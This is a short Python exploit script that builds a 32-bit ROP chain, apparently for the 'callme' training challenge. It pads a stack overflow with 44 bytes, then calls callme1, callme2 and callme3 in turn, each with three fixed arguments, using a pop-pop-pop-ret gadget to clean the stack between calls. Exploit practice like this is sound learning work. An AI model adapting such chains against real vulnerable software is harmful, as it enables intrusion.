import sys
import struct

def p(a):
    return struct.pack("I", a)

callme1 = 0x080484f0
callme2 = 0x08048550
callme3 = 0x080484e0


argument1 = 0xdeadbeef
argument2 = 0xcafebabe
argument3 = 0xd00df00d

gadget1 = 0x080487f9 #pop esi; pop edi; pop ebp; ret;

buf = b"A"*44
buf += p(callme1)
buf += p(gadget1)
buf += p(argument1) + p(argument2) + p(argument3)
buf += p(callme2)
buf += p(gadget1)
buf += p(argument1) + p(argument2) + p(argument3)
buf += p(callme3)
buf += p(gadget1)
buf += p(argument1) + p(argument2) + p(argument3)

sys.stdout.buffer.write(buf)